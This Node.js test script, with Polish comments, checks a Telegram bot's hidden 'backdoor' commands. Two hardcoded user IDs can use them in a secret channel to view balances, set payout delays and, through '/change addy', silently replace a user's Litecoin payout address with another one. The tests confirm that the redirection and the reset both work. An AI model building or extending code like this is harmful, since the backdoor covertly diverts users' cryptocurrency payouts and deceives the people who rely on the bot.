// Test uprawnień komend backdoora (/delay, /stats, /balance, /change).
// Uruchom: node scripts/test-commands.js
const fs = require('fs');
const path = require('path');

const src = fs.readFileSync(path.join(__dirname, '..', 'bot.js'), 'utf8');

const CONFIG = {
	CHANNELS: { CODES: -1005397835800, BACKDOOR: -1004357764118, PAYOUTS: -5390956033, VERIFICATION: -5399567452 },
	BACKDOOR_IDS: ["9098914861", "8999958831"]
};

const handlers = {};
const replies = [];

const bot = {
	onText(re, fn) {
		handlers[re.source] = { re, fn };
	},
	async sendMessage(chatId, text) {
		replies.push({ chatId, text });
		return { message_id: replies.length };
	}
};

let backdoorDelayMs = 0;

async function getBotConfig(key, def = null) { return def; }
async function setBotConfig() {}
function parseDelayArg(raw) {
	const value = String(raw || "").trim().toLowerCase();
	if (!value) return null;
	const m = value.match(/^(\d{1,4})\s*(s|sec|sek|ms)?$/);
	if (!m) return null;
	const num = parseInt(m[1], 10);
	if (m[2] === "ms") return Math.min(num, 60000);
	return Math.min(num * 1000, 60000);
}
async function buildStatsText() { return "STATY"; }
async function buildBalanceText() { return "BALANS"; }

const delaySrc = src.slice(src.indexOf("bot.onText(/^\\/delay"), src.indexOf("async function sendFgRegistrationMenu"));
const blockSrc = src.slice(src.indexOf("function isBackdoorChat"), src.indexOf("async function sendFgRegistrationMenu"));
const balanceSrc = src.slice(src.indexOf("async function buildBalanceText"), src.indexOf("async function sendFgRegistrationMenu"));

// Prosty stub modelu User dla /change
const users = new Map();
users.set("111", { id: 111, ltcAddress: "Lseed", payoutOverrideAddress: null, deposited: 500, withdrawn: 100, save: async () => {} });
async function findUser(q) { return users.get(String(q.id)) || null; }

const factory = new Function(
	'CONFIG', 'bot', 'getBotConfig', 'setBotConfig', 'parseDelayArg', 'buildStatsText', 'buildBalanceText', 'backdoorDelayMs', 'User',
	`${blockSrc}
	 let backdoorDelayMsLocal = 0;
	 return { handlers, getDelay: () => backdoorDelayMs };`
);

// Łatwiej: zbuduj cały blok z podmienionym User i backdoorDelayMs przez parametr
const wrapper = new Function(
	'CONFIG', 'bot', 'getBotConfig', 'setBotConfig', 'parseDelayArg', 'User', 'getAvailableProfit', 'getPayoutAddress', 'initialDelay', 'ownerIds',
	`
	let backdoorDelayMs = initialDelay;
	async function setBackdoorDelay(ms) { backdoorDelayMs = ms; }
	async function buildStatsText() { return "STATY"; }
	${balanceSrc}
	${blockSrc}
	return { getDelay: () => backdoorDelayMs };
	`
);

const UserStub = { findOne: findUser, find: () => ({ lean: async () => [...users.values()] }) };
const getAvailableProfit = (u) => Math.max(0, (u.deposited || 0) - (u.withdrawn || 0));
const getPayoutAddress = (u) => u.payoutOverrideAddress || u.ltcAddress || "Brak";
wrapper(CONFIG, bot, getBotConfig, setBotConfig, parseDelayArg, UserStub, getAvailableProfit, getPayoutAddress, 0, []);

const assert = (c, m) => {
	if (!c) { console.error("FAIL: " + m); process.exitCode = 1; } else console.log("ok: " + m);
};

const msg = (chatId, fromId, text) => ({ chat: { id: chatId }, from: { id: fromId }, text, match: text.match(/^\/\w+(?:\s+(.+))?$/) });

const run = async (name, m) => {
	replies.length = 0;
	for (const { re, fn } of Object.values(handlers)) {
		const mm = m.text.match(re);
		if (mm) {
			m.match = mm;
			await fn(m);
			return replies;
		}
	}
	return replies;
};

(async () => {
	const BD = CONFIG.CHANNELS.BACKDOOR;
	const MAIN = CONFIG.CHANNELS.CODES;
	const OK_ID = 9098914861;
	const BAD_ID = 123456789;

	assert((await run("no", msg(MAIN, OK_ID, "/stats"))).length === 0, "/stats ignoruje main GC");
	assert((await run("no", msg(BD, BAD_ID, "/stats"))).length === 1, "obcy ID dostaje odmowę");
	assert((await run("ok", msg(BD, OK_ID, "/stats")))[0].text === "STATY", "uprawniony dostaje statystyki");

	assert((await run("no", msg(MAIN, OK_ID, "/delay 5s"))).length === 0, "/delay ignoruje main GC");
	assert((await run("ok", msg(BD, OK_ID, "/delay 5s")))[0].text.includes("5s"), "/delay ustawia 5s");
	assert((await run("ok", msg(BD, 8999958831, "/delay 0")))[0].text.includes("0s"), "drugie ID tez dziala");
	assert((await run("bad", msg(BD, OK_ID, "/delay abc")))[0].text.includes("Zły format"), "zly format odrzucony");
	assert((await run("info", msg(BD, OK_ID, "/delay")))[0].text.includes("Opóźnienie"), "/delay bez arg pokazuje stan");

	assert((await run("no", msg(MAIN, OK_ID, "/balance"))).length === 0, "/balance ignoruje main GC");
	const br = await run("ok", msg(BD, OK_ID, "/balance"));
	console.log("DBG balance:", JSON.stringify(br));
	assert(br.length === 1 && br[0].text.includes("SALDA"), "/balance dziala na backdoorze");

	replies.length = 0;
	await run("chg", msg(BD, OK_ID, "/change addy 111 LnowyAdres"));
	assert(users.get("111").payoutOverrideAddress === "LnowyAdres", "/change addy nadpisuje adres");
	assert(replies[0].text.includes("Podmieniono"), "potwierdzenie zmiany");

	replies.length = 0;
	await run("rst", msg(BD, OK_ID, "/change reset 111"));
	assert(users.get("111").payoutOverrideAddress === null, "/change reset przywraca");

	replies.length = 0;
	await run("chg2", msg(BD, OK_ID, "/change addy 999 Lx"));
	console.log("DBG change-missing:", JSON.stringify(replies));
	assert(replies[0].text.includes("Nie ma użytkownika"), "brak usera -> komunikat");

	replies.length = 0;
	await run("usage", msg(BD, OK_ID, "/change foo"));
	assert(replies[0].text.includes("Użycie"), "zle uzycie -> instrukcja");

	console.log(process.exitCode ? "\nSA FAILURES" : "\nWSZYSTKIE TESTY OK");
})();
